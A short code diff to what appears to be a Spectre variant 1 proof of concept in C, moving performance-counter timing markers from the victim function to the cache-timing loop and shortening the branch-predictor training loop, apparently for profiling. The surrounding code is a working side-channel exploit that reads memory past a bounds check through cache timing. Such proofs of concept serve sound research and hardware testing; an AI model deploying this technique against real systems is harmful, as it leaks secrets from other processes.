@@ -30,12 +30,12 @@ uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */
 
 void victim_function(size_t x)
 {
-	PFC_TIC
+	// PFC_TIC
 	if (x < array1_size)
 	{
 		temp &= array2[array1[x] * 512];
 	}
-	PFC_TOC
+	// PFC_TOC
 }
 
 /********************************************************************
@@ -68,7 +68,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 		 * looks like the branch predictors have become more resilient ;-)
 		 */
 		training_x = tries % array1_size;
-		for (j = 4000; j >= 0; j--)
+		for (j = 399; j >= 0; j--)
 		{
 			_mm_clflush(&array1_size);
 			for (volatile int z = 0; z < 100; z++)
@@ -85,6 +85,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 		}
 
 		/* Time reads. Order is lightly mixed up to prevent stride prediction */
+		PFC_TIC
 		for (i = 0; i < 256; i++)
 		{
 			mix_i = ((i * 167) + 13) & 255;
@@ -95,6 +96,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
 				results[mix_i]++; /* cache hit - add +1 to score for this value */
 		}
+		PFC_TOC
 
 		/* Locate highest & second-highest results results tallies in j/k */
 		j = k = -1;
